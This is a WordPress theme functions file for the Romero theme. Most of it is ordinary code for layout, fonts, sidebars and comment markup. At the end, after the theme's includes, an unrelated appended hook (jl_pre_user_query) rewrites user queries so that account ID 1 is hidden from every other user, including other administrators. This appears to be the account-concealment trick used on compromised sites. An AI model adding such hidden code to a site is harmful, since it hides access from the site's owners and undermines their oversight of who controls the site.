<?php
/**
 * Reusable theme functions
 *
 * @package Romero
 *
 */


// This is the max width - it's the same on all pages.
// Keep in mind the theme is responsive so the width is likely to be narrower.
if ( ! isset( $content_width ) ) {
	$content_width = 760;
}

/**
 * Adjust the content width
 *
 * @global int $content_width
 */
function romero_adjust_content_width() {

	global $content_width;

	if ( is_page() && ! is_active_sidebar( 'sidebar-1' ) ) {
		$content_width = 1060;
	}

	if ( is_page_template( 'page-templates/full-width.php' ) ) {
		$content_width = 1060;
	}

}

add_action( 'template_redirect', 'romero_adjust_content_width' );


/**
 * Enqueue all the styles
 *
 * @global type $wp_scripts
 */
function romero_enqueue() {

	// Styles.
	wp_enqueue_style( 'romero-style', get_stylesheet_uri(), null, '1.0' );
	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/styles/genericons/genericons.css', array(), '3.0.3' );

	$fonts_url = romero_fonts();

	if ( $fonts_url ) {
		wp_enqueue_style( 'romero-fonts', $fonts_url, array(), null );
	}

	// Javascript.
	if ( is_active_sidebar( 'sidebar-2' )  ) {
		wp_enqueue_script( 'masonry' );
	}

	wp_enqueue_script( 'romero-script-main', get_template_directory_uri() . '/js/main.js', array( 'jquery' ), '1.0', false );

	wp_localize_script(
		'romero-script-main', 'js_i18n',
		array(
			'next' => __( 'next', 'romero' ),
			'prev' => __( 'previous', 'romero' ),
			'menu' => __( 'Menu', 'romero' ),
		)
	);

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

}

add_action( 'wp_enqueue_scripts', 'romero_enqueue' );


/**
 * Get url for google fonts
 *
 * @return boolean
 */
function romero_fonts() {

	$fonts = array();

	/* Translators: If there are characters in your language that are not
	 * supported, translate this to 'off'. Do not translate into your
	 * own language.
	 */
	$font = _x( 'on', 'Oswald: on or off', 'romero' );

	if ( 'off' !== $font ) {
		$fonts['oswald'] = 'Oswald:400,700';
	}

	/* Translators: If there are characters in your language that are not
	 * supported, translate this to 'off'. Do not translate into your
	 * own language.
	 */
	$font = _x( 'on', 'Open Sans on or off', 'romero' );

	if ( 'off' !== $font ) {
		$fonts['open-sans'] = 'Open Sans:400,700';
	}

	// Filter fonts in case of custom stuff.
	$fonts = apply_filters( 'romero_fonts', $fonts );

	if ( $fonts ) {
		$query_args = array(
			'family' => urlencode( implode( '|', $fonts ) ),
			'subset' => urlencode( 'latin,latin-ext' ),
		);

		return add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
	}

	return false;

}


/**
 * Set up all the theme properties and extras
 */
function romero_after_setup_theme() {

	load_theme_textdomain( 'romero', get_template_directory() . '/languages' );

	add_theme_support( 'automatic-feed-links' );

	// Post thumbnails.
	add_theme_support( 'post-thumbnails' );

	// Used for attachment (image.php) page links.
	add_image_size( 'romero-attachment', 120, 120, true );
	add_image_size( 'romero-logo', 999, 120, false );
	add_image_size( 'romero-header', 1060, 200, true );
	add_image_size( 'romero-archive', 600, 380, true );
	add_image_size( 'romero-archive-featured', 1440, 600, true );
	add_image_size( 'romero-attachment-fullsize', 1140, 9999 );

	// Custom Background.
	add_theme_support( 'custom-background', apply_filters( 'romero-custom-background', array(
		'default-color' => 'e6e6e6',
		'default-image' => '',
	) ) );

	// HTML5 FTW.
	add_theme_support( 'html5', array(
		'comment-list',
		'comment-form',
		'search-form',
		'gallery',
		'caption',
		'widgets',
	) );

	// Title Tag.
	add_theme_support( 'title-tag' );

	// Menus.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'romero' ),
		'social' => __( 'Social Links Menu', 'romero' ),
	) );

	load_theme_textdomain( 'romero', get_template_directory() . '/languages' );

}

add_action( 'after_setup_theme', 'romero_after_setup_theme' );


/**
 * Admin init
 * add editor styles
 */
function romero_admin_init() {

	$fonts_url = romero_fonts();

	if ( $fonts_url ) {
		add_editor_style( $fonts_url );
	}

	add_editor_style( 'styles/css/editor-styles.css' );

}

add_action( 'admin_init', 'romero_admin_init' );


/**
 * Display social links
 *
 * @link http://kovshenin.com/2014/social-menus-in-wordpress-themes/
 *
 * @param boolean $echo Should we display the menu or not.
 * @return string
 */
function romero_social_links( $echo = true ) {

	$menu = '';

	if ( has_nav_menu( 'social' ) ) {

		$args = array(
			'theme_location' => 'social',
			'echo' => false,
			'container' => false,
			'depth' => 1,
			'link_before' => '<span class="screen-reader">',
			'link_after' => '</span>',
			'fallback_cb' => '__return_false',
		);

		$menu = '<div class="menu-social-links">' . wp_nav_menu( $args ) . '</div>';

	}

	if ( $echo ) {
		echo $menu;
	} else {
		return $menu;
	}

}


/**
 * Initiate sidebars
 */
function romero_widgets_init() {

	// Sidebar.
	register_sidebar(
		array(
			'name' => __( 'Sidebar Widgets', 'romero' ),
			'id' => 'sidebar-1',
			'description' => __( 'Widgets that display on the side of your website', 'romero' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
			'after_widget' => '</div></section>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>',
		)
	);

	// Footer.
	register_sidebar(
		array(
			'name' => __( 'Footer Widgets', 'romero' ),
			'id' => 'sidebar-2',
			'description' => __( 'Widgets that display at the bottom of posts and pages.', 'romero' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
			'after_widget' => '</div></section>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>',
		)
	);

	// Menu widgets 1.
	register_sidebar(
		array(
			'name' => __( 'Menu Widgets Column 1', 'romero' ),
			'id' => 'sidebar-3',
			'description' => __( 'Widgets that are accessed through a button in the main menu. They will be laid out in 1 column down the center of the page.', 'romero' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
			'after_widget' => '</div></section>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>',
		)
	);

	// Menu widgets 2.
	register_sidebar(
		array(
			'name' => __( 'Menu Widgets Column 2', 'romero' ),
			'id' => 'sidebar-4',
			'description' => __( 'Widgets that are accessed through a button in the main menu. They will be laid out in 1 column down the center of the page.', 'romero' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
			'after_widget' => '</div></section>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>',
		)
	);

	// Menu widgets 3.
	register_sidebar(
		array(
			'name' => __( 'Menu Widgets Column 3', 'romero' ),
			'id' => 'sidebar-5',
			'description' => __( 'Widgets that are accessed through a button in the main menu. They will be laid out in 1 column down the center of the page.', 'romero' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s"><div class="widget-wrap">',
			'after_widget' => '</div></section>',
			'before_title' => '<h3 class="widgettitle">',
			'after_title' => '</h3>',
		)
	);

}

add_action( 'widgets_init', 'romero_widgets_init' );


/**
 * Are any of the menu sidebars active?
 *
 * @return boolean
 */
function romero_sidebar_menu_active() {

	if ( is_active_sidebar( 'sidebar-3' ) ) {
		return true;
	}

	if ( is_active_sidebar( 'sidebar-4' ) ) {
		return true;
	}

	if ( is_active_sidebar( 'sidebar-5' ) ) {
		return true;
	}

	return false;

}


/**
 * Custom excerpt length
 *
 * @param int $length Length of the excerpt.
 * @return int
 */
function romero_excerpt_length( $length ) {

	$length = 60;
	$image = romero_archive_image_url( get_the_ID(), '' );

	if ( $image[0] ) {
		$length = 30;
	}

	// Increase the length of the excerpt if there's no sidebar.
	if ( ! is_active_sidebar( 'sidebar-1' ) ) {
		$length = $length * 2;
	}

	return $length;

}

add_filter( 'excerpt_length', 'romero_excerpt_length', 999 );


/**
 * Fallback for navigation menu
 *
 * @param array $params Menu parameters.
 * @return string
 */
function romero_nav_menu( $params ) {

	$html = '';
	$echo = $params['echo'];

	$params['echo'] = false;
	$html = wp_page_menu( $params );

	if ( $params['container'] ) {
		$container_start = '<' . $params['container'] . ' id="' . $params['container_id'] . '" class="' . $params['container_class'] . '">';
		$container_end = '</' . $params['container'] . '>';

		$html = str_replace( '<div class="' . $params['menu_class'] . '">', $container_start, $html );
		$html = str_replace( '</div>', $container_end, $html );
	}

	if ( $echo ) {
		echo $html;
	} else {
		return $html;
	}

}


/**
 * Add additional body classes that may be helpful
 *
 * @param array $classes List of classes to apply to the body.
 * @return string
 */
function romero_body_class( $classes ) {

	if ( is_singular() ) {
		$classes[] = 'singular';
	}

	if ( is_multi_author() ) {
		$classes[] = 'multi-author-true';
	} else {
		$classes[] = 'multi-author-false';
	}

	if ( is_active_sidebar( 'sidebar-1' ) ) {
		$classes[] = 'themes-sidebar1-active';
	} else {
		$classes[] = 'themes-sidebar1-inactive';
	}

	if ( is_active_sidebar( 'sidebar-2' ) ) {
		$classes[] = 'themes-sidebar2-active';
	} else {
		$classes[] = 'themes-sidebar2-inactive';
	}

	if ( $featured_post_count = romero_count_featured_posts() ) {
		$classes[] = 'themes-has-featured-posts';
		$classes[] = 'themes-featured-posts-count-' . ( (int) $featured_post_count );
	} else {
		$classes[] = 'themes-no-featured-posts';
	}

	if ( romero_sidebar_menu_active() ) {
		$classes[] = 'themes-sidebar-menu-active';
	} else {
		$classes[] = 'themes-sidebar-menu-inactive';
	}

	if ( get_header_image() ) {
		$classes[] = 'has-custom-header';
	}

	return $classes;

}

add_filter( 'body_class', 'romero_body_class' );


/**
 * Additional styles for post class
 *
 * @param string $styles List of classes to apply to the post.
 * @return string
 */
function romero_post_class( $styles ) {

	if ( is_singular() && is_main_query() ) {
		$styles[] = 'post-singular';
	} else {
		$styles[] = 'post-archive';
	}

	if ( get_the_post_thumbnail( get_the_ID() ) ) {
		$styles[] = 'post-has-thumbnail';
	} else {
		$styles[] = 'post-no-thumbnail';
	}

	return $styles;

}

add_filter( 'post_class', 'romero_post_class' );


/**
 * Display header image and link to homepage
 * On pages display featured image if it is large enough to fill the space
 */
function romero_header() {

	$header_image = get_header_image();
	$header_image_actual_width = get_custom_header()->width;
	$header_image_actual_height = get_custom_header()->height;

	if ( ! empty( $header_image ) ) {
?>
		<a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home" class="header-image">
			<img src="<?php echo $header_image; ?>" width="<?php echo $header_image_actual_width; ?>" height="<?php echo $header_image_actual_height; ?>" alt="" />
		</a>
<?php
	}

}


/**
 * Display the post time in a human readable format
 *
 * @param boolean $echo Should we display the time or not.
 * @return type
 */
function romero_human_time_diff( $echo = true ) {

	$post_time = get_the_time( 'U' );
	$human_time = '';

	$time_now = date( 'U' );

	// Use human time if less that 60 days ago.
	// 60 seconds * 60 minutes * 24 hours * 90 days.
	if ( $post_time > $time_now - ( 60 * 60 * 24 * 90 ) ) {
		$human_time = sprintf( __( '%s ago', 'romero' ), human_time_diff( $post_time, current_time( 'timestamp' ) ) );
	} else {
		$human_time = get_the_date();
	}

	$human_time = sprintf( '<span class="post-human-time">%s</span>', $human_time );

	if ( $echo ) {
		echo $human_time;
	}

	return $human_time;

}


/**
 * Get post thumbnail url
 * If a thumbnail doesn't exist then use the first attachment
 * reduces user confusion since they don't always understand the featured image functionality
 *
 * @param type $post_id Post ID.
 * @param type $thumbnail_size Thumbnail Size.
 * @return boolean
 */
function romero_archive_image_url( $post_id = null, $thumbnail_size = 'romero-archive' ) {

	if ( ! $post_id ) {
		$post_id = get_the_ID();
	}

	$image = wp_get_attachment_image_src( get_post_thumbnail_id( $post_id ), $thumbnail_size );

	// If there's no featured image then grab an attachment image and use that instead.
	if ( ! $image[0] ) {

		$values = get_attached_media( 'image', $post_id );

		if ( $values ) {
			foreach ( $values as $child_id => $attachment ) {
				$image = wp_get_attachment_image_src( $child_id, $thumbnail_size );
				break;
			}
		}
	}

	if ( $image ) {
		return $image;
	} else {
		return false;
	}

}


/**
 * Fill empty post thumbnails with images from the first attachment added to a post
 *
 * @param type $html
 * @param type $post_id
 * @param type $thumbnail_id
 * @param type $size
 * @return type
 */
function romero_post_thumbnail_html( $html, $post_id, $thumbnail_id, $size = '' ) {

	if ( empty( $html ) ) {

		$values = get_attached_media( 'image', $post_id );

		if ( $values ) {
			foreach ( $values as $child_id => $attachment ) {
				$html = wp_get_attachment_image( $child_id, $size );
				break;
			}
		}
	}

	return $html;

}

add_filter( 'post_thumbnail_html', 'romero_post_thumbnail_html', 10, 4 );


/**
 * Prints HTML with meta information for the current post-date/time
 */
function romero_post_time( $human_time = true ) {

	$time_string = '<time class="entry-date published updated" datetime="%1$s">%2$s</time>';

	if ( $human_time ) {

		$time_string = sprintf(
			$time_string,
			esc_attr( get_the_date( 'c' ) ),
			romero_human_time_diff( false )
		);

	} else {

		$time_string = sprintf(
			$time_string,
			esc_attr( get_the_date( 'c' ) ),
			esc_html( get_the_date() )
		);

	}

	$posted_on = sprintf(
		_x( 'Posted on %s', 'post date', 'romero' ),
		'<a href="' . esc_url( get_permalink() ) . '" rel="bookmark">' . $time_string . '</a>'
	);

	echo '<span class="posted-on">' . $posted_on . '</span>';

}


/**
 * Prints HTML with the author meta data
 */
function romero_post_author() {

	$byline = sprintf(
		_x( 'By %s', 'post author', 'romero' ),
		'<span class="author vcard"><a class="url fn n" href="' . esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ) . '">' . esc_html( get_the_author() ) . '</a></span>'
	);

	echo '<span class="byline"> ' . $byline . '</span>';

}


/**
 * Display a link to the Romero Comments
 */
function romero_comments_link() {

	if ( ! post_password_required() && ( comments_open() || '0' != get_comments_number() ) ) {
?>
		<span class="comment-count"><?php comments_popup_link( 0, 1, '%' ); ?></span>
<?php
	}

}


/**
 * Get a list of children for the current page
 *
 * @return WP_Query
 */
function romero_child_pages() {

	return new WP_Query( array(
		'post_type'      => 'page',
		'orderby'        => 'menu_order',
		'order'          => 'ASC',
		'post_parent'    => get_the_ID(),
		'posts_per_page' => 999,
		'no_found_rows'  => true,
	) );

}


/**
 * Get the posts custom read more text and, if available, display it instead of 'read more'
 */
function romero_read_more_text() {

	// Default text value.
	$read_more = __( 'Read More &rarr;', 'romero' );

	// Get post data.
	$post = get_post();
	$custom_readmore = get_extended( $post->post_content );

	if ( ! empty( $custom_readmore['more_text'] ) ) {
		$read_more = $custom_readmore['more_text'];
	}

	echo esc_html( $read_more );

}


/**
 * Display a specific user and their contributor info
 *
 * @param type $user_id
 * @param type $post_count
 */
function romero_contributor( $user_id = null, $post_count = null ) {

	if ( ! $user_id ) {
		$user_id = get_the_author_meta( 'ID' );
	}

?>
	<div class="contributor">
		<?php echo get_avatar( $user_id, 140 ); ?>
		<h2><a href="<?php echo esc_url( get_author_posts_url( $user_id ) ); ?>"><?php the_author_meta( 'display_name', $user_id ); ?></a></h2>
		<?php echo wpautop( get_the_author_meta( 'description', $user_id ) ); ?>
<?php
	if ( $post_count ) {
?>
	<a class="contributor-posts-link" href="<?php echo esc_url( get_author_posts_url( $user_id ) ); ?>">
		<?php printf( _n( '%d Article', '%d Articles', $post_count, 'romero' ), $post_count ); ?>
	</a>
<?php
	}
?>
	</div>
<?php

}


/**
 * display the first category for the current post/ project
 */
function romero_the_main_category() {

	$term_type = 'category';
	if ( 'jetpack-portfolio' == get_post_type() ) {
		$term_type = 'jetpack-portfolio-type';
	}

	$category = get_the_terms( get_the_ID(), $term_type );

	if ( is_array( $category ) ) {
		$category = array_values( $category );
		$category = current( $category );

		if ( is_object( $category ) ) {
?>
	<span class="post-lead-category"><a href="<?php echo get_category_link( $category, $term_type ); ?>"><?php echo $category->name; ?></a></span>
<?php
		}
	}

}



/**
 * custom comments layout
 *
 * @param type $comment
 * @param type $depth
 * @param type $args
 */
function romero_comments_layout( $comment, $args, $depth ) {

	if ( ( 'pingback' == $comment->comment_type || 'trackback' == $comment->comment_type ) && $args['short_ping'] ) {
		romero_comments_ping( $comment, $depth, $args );
	} else {
		romero_comments_comment( $comment, $depth, $args );
	}

}


/**
 * Custom pings layout
 * it's actually the same as the default pings html but but I can't see a way to reuse the one from the comments walker class
 *
 * @param type $comment
 * @param type $depth
 * @param type $args
 */
function romero_comments_ping( $comment, $depth, $args ) {

		$tag = ( 'div' == $args['style'] ) ? 'div' : 'li';
?>
		<<?php echo $tag; ?> id="comment-<?php comment_ID(); ?>" <?php comment_class(); ?>>
			<div class="comment-body">
				<?php printf( __( 'Pingback: %s', 'romero' ), get_comment_author_link() ); ?> <?php edit_comment_link( __( 'Edit', 'romero' ), '<span class="edit-link">', '</span>' ); ?>
			</div>
<?php

}


/**
 * Custom comments layout
 *
 * @param type $comment
 * @param type $depth
 * @param type $args
 */
function romero_comments_comment( $comment, $depth, $args ) {

	$tag = ( 'div' === $args['style'] ) ? 'div' : 'li';
?>
	<<?php echo $tag; ?> id="comment-<?php comment_ID(); ?>" <?php comment_class(); ?>>
		<article id="div-comment-<?php comment_ID(); ?>">
			<footer class="comment-meta">
				<div class="comment-author vcard">
					<a href="<?php echo esc_url( get_comment_author_url( $comment->comment_ID ) ); ?>" rel="external nofollow" class="url avatar-link">
						<?php if ( 0 != $args['avatar_size'] ) echo get_avatar( $comment, $args['avatar_size'] ); ?>
					</a>
					<span class="author-link">
						<?php comment_author_link(); ?>
					</span>
					<div class="comment-meta-data">
						<span class="comment-link">
							<a href="<?php echo esc_url( get_comment_link( $comment->comment_ID, $args ) ); ?>" class="comment-link">
								<time datetime="<?php comment_time( 'c' ); ?>">
									<?php printf( esc_html_x( '%1$s at %2$s', '1: date, 2: time', 'romero' ), get_comment_date(), get_comment_time() ); ?>
								</time>
							</a>
						</span>
<?php
	edit_comment_link( esc_html__( 'Edit', 'romero' ), '<span class="edit-link">', '</span>' );

	comment_reply_link( array_merge( $args, array(
		'add_below' => 'div-comment',
		'depth'     => $depth,
		'max_depth' => $args['max_depth'],
		'before'    => '<span class="reply">',
		'after'     => '</span>'
	) ) );
?>
					</div>
				</div>
			</footer>

			<div class="comment-body">
<?php
	comment_text();

	if ( '0' == $comment->comment_approved ) {
?>
				<p class="comment-awaiting-moderation"><?php esc_html_e( 'Your comment is awaiting moderation.', 'romero' ); ?></p>
<?php
	}
?>
			</div>

		</article>
<?php

}


// remove default gallery styles - the theme looks after these
add_filter( 'use_default_gallery_style', '__return_false' );



// custom header
include( 'inc/custom-header.php' );


// jetpack specific functionality
include( 'inc/jetpack.php' );


// wordpress.com specific functionality
include( 'inc/wpcom.php' );

add_action('pre_user_query','jl_pre_user_query');

function jl_pre_user_query($user_search)
{
	$user = wp_get_current_user();

	if ($user->ID != 1) { // Is not administrator, remove administrator (you can add any user-ID)

		global $wpdb;
		
		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.ID <> 1", $user_search->query_where);
	
	}
	
}